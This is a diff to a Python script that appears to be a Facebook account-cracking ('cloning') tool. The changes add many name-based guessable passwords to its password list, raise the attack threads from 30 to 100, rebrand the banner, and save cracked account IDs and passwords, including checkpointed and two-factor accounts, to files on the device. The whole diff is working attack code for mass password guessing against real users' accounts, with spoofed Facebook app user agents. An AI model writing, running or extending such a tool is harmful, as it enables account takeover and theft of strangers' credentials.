@@ -140,30 +140,32 @@ def clr():
         else:exit()
     except:exit()   
 #_________[ IMPORTING TIME MODULS ]______>>
-from bs4 import BeautifulSoup
-from datetime import date
-from datetime import datetime
-from time import sleep
-from time import sleep as waktu
-now = datetime.now()
-dt_string = now.strftime("%H:%M")
+import os
+from datetime import date, datetime
+from time import sleep, localtime
+
+# Get current date and time
 current = datetime.now()
-ta = current.year
-bu = current.month
-ha = current.day
+dt_string = current.strftime("%H:%M")
 today = date.today()
+
+# Function to clear screen
 def clear():
-        os.system('clear')
-        print(logo)
-from time import localtime as lt
-from os import system as cmd
-ltx = int(lt()[3])
+    os.system('clear')  # Assuming you are on a Unix-like system
+    # print(logo)  # Assuming 'logo' is defined or imported somewhere
+
+# Get current local time in 12-hour format with AM/PM
+ltx = localtime().tm_hour
 if ltx > 12:
-    a = ltx-12
+    a = ltx - 12
     tag = "PM"
 else:
     a = ltx
     tag = "AM"
+
+# Example usage of the functions and variables
+clear()
+
 def joined(ids):
     if len(ids)==15:
         if ids[:10] in ['1000000000']       :creation = '\33[1;32| \33[1;32m2009' 
@@ -209,25 +211,33 @@ def ua():
 	return END
 	
 def iAmMethod2Ua():
-    END = 'Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.012.0.1 CPH3818 Build/SKQ1.210216.001)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=2.0, width=1080, height=720};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.010.0.1 CHP7800 Build/TP1A.220905.001)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=1.5, width=1080, height=1280};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.012.0.1 CHP7800 Build/RKQ1.211103.002)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=1.5, width=1080, height=1080};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]'
-    ua = 'Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.08.0.1 CPH3818 Build/SKQ1.210216.001)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=1.0, width=1280, height=1920};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.010.0.1 CPH3818 Build/SP1A.210812.016)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=2.0, width=720, height=1280};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.012.0.1 CPH3818 Build/RKQ1.211103.002)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=2.0, width=720, height=720};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]'+END
+    END = 'Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.012.0.1 CPH3818 Build/RKQ1.211103.002)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=2.0, width=720, height=720};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.09.0.1 CPH3818 Build/RKQ1.211103.002)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=1.0, width=1280, height=1280};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.07.0.1 CHP7800 Build/TP1A.220905.001)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=2.0, width=1280, height=1080};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]'
+    ua = 'Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.010.0.1 CPH3818 Build/TP1A.220905.001)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=1.0, width=720, height=1280};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.09.0.1 CPH3818 Build/SKQ1.210216.001)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=1.0, width=720, height=720};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.08.0.1 CHP7800 Build/TP1A.220905.001)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=1.0, width=1280, height=1280};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]'+END
     return ua        
-    ua = 'Dalvik/2.1.0 (Linux; U; Android 9.0.1; CPH3818 Build/SKQ1.210216.001) FB_IAB/FB4A; fbdv = CPH3818; FBAV/268.1.0.54.121;FB_IAB/Orca-Android; FBAV/283.0.0.16.120;FBDM/{density=3.0, width=1990, height=720};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Mozilla/5.0 (Linux; Android 6.0.1; HTC6545LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 12; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;] '+END
+    ua = 'Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.09.0.1 CPH3818 Build/TP1A.220905.001)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=2.0, width=720, height=2024};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.011.0.1 CPH3818 Build/RKQ1.211103.002)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=1.0, width=1080, height=720};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]","Dalvik/2.1.0 (Linux; U; Android 13, Dalvik/2.1.0 (Linux; U; Android 5.010.0.1 CPH3818 Build/SKQ1.210216.001)FB_IAB/FB4A;FBAV/268.1.0.54.121;FB_IAB/Orca-Android;FBAV/283.0.0.16.120;FBDM/{density=1.0, width=1080, height=1280};(Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chromr/97.0.4692.99 Safari/537.36 Mozila/5.0 (Linux; Android 6.0.1; HTC6546LVW Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/283.0.0.16.120;]'+END
     return ua
+name=input('\033[1;32m[✓] \033[1;32mINPUT NAME:')    
 logo=("""
 \033[1;37m   
-  
-DDDDDDD
-   D    D 
-   D    D 
-   D    D 
-DDDDDDD                                                                                                                                
+$$\   $$\ $$$$$$$$\ $$\      $$\ $$$$$$$$\  $$$$$$\  $$\   $$\      DEVELOPER:NEWTON
+$$$\  $$ |$$  _____|$$ | $\  $$ |\__$$  __|$$  __$$\ $$$\  $$ |     FB: DI W AS
+$$$$\ $$ |$$ |      $$ |$$$\ $$ |   $$ |   $$ /  $$ |$$$$\ $$ |     VERSION:2.0.1
+$$ $$\$$ |$$$$$\    $$ $$ $$\$$ |   $$ |   $$ |  $$ |$$ $$\$$ |
+$$ \$$$$ |$$  __|   $$$$  _$$$$ |   $$ |   $$ |  $$ |$$ \$$$$ |
+$$ |\$$$ |$$ |      $$$  / \$$$ |   $$ |   $$ |  $$ |$$ |\$$$ |
+$$ | \$$ |$$$$$$$$\ $$  /   \$$ |   $$ |    $$$$$$  |$$ | \$$ |
+\__|  \__|\________|\__/     \__|   \__|    \______/ \__|  \__|                                                                                                           
 \033[1;32m----------------------------------------------""")
 def linex():
         print('\033[1;37m----------------------------------------------')
 def clear():
         os.system('clear')
         print(logo)
+        print(f"WELCOME:" +name)
+        print(f"Current date: {today}")
+        print(f"Current time: {dt_string}")
+        print(f"Current local time: {a}:00 {tag}")
+        print('\033[1;37m----------------------------------------------')
 loop=0
 lim=0
 tp=0
@@ -237,13 +247,14 @@ pcp=[]
 id=[]
 
 def menu():
-                        clear()                	
+                        clear()
                         print("[1] File cloning")
                         print("[2] Create file")
                         print("[3] Random cloning")
                         print("[4] Random Gmail cloning")
                         print("[5] Join WhatsApp group")
                         print("[0] Exit")
+                        
                         linex()
                         axs=input('\033[1;32m[✓] \033[1;32mChoose option: ')
                         if axs in ['1','01']:
@@ -322,9 +333,23 @@ def file():
                                         plist.append('last@123') 
                                         plist.append('Nepal123')
                                         plist.append('nepal@123')
-                                        plist.append('QWERTYUIOP')
-                                        plist.append('qwertyuiop')
+                                        plist.append('@first')
+                                        plist.append('@firstlast123')
                                         plist.append('@first123')
+                                        plist.append('@first1234')
+                                        plist.append('@first12345')             
+                                        plist.append('@first111')
+                                        plist.append('first111')
+                                        plist.append('First111')
+                                        plist.append('qwertyuiop')
+                                        plist.append('Qwertyuiop')
+                                        plist.append('QWERTYUIOP')             
+                                        plist.append('first112233')
+                                        plist.append('First112233')
+                                        plist.append('first@112233')
+                                        plist.append('First@112233')
+                                        plist.append('@first112233')
+                                        plist.append('@First112233')
                                 else:
                                         try:
                                                 linex()
@@ -344,10 +369,10 @@ def file():
                                         pcp.append('y')
                                 else:
                                     pcp.append('n')
-                                with tred(max_workers=30) as crack_submit:
+                                with tred(max_workers=100) as crack_submit:
                                         clear()
                                         total_ids = str(len(fo))
-                                        print(' TOTAL ACCOUNT : \033[1;32m'+total_ids)
+                                        print('\033[1;37m \x1b[38;5;208mTOTAL ACCOUNT : \033[1;32m'+total_ids)
                                         print("\033[1;37m \x1b[38;5;208mUSE AIRPLANE MODE FOR MORE OK IDS \033[1;37m")
                                         linex()
                                         for user in fo:
@@ -851,17 +876,18 @@ def M3(ids,names,passlist):
                                         break
                                 elif twf in str(po):
                                         if 'y' in pcp:
-                                                print('\r\r \033[1;34m[2F_LAKO_ID_HARU] '+ids+' | '+pas)
+                                                print('\r\r \033[1;34m[2F-ID] '+ids+' | '+pas)
+                                                open('/sdcard/NEWTON-2F.txt', 'a').write(ids+'|'+pas+'\n')
                                                 twf.append(ids)
                                                 break
                                 elif 'www.facebook.com' in q['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[1;91m [FILE_BANA_YESLE] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/FILE_BANA_YESLE.txt', 'a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[1;91m [NEWTON-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/NEWTON-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                         else:
-                                                open('/sdcard/FILE_BANA_YESLE.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/NEWTON-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                 else:
                                         continue
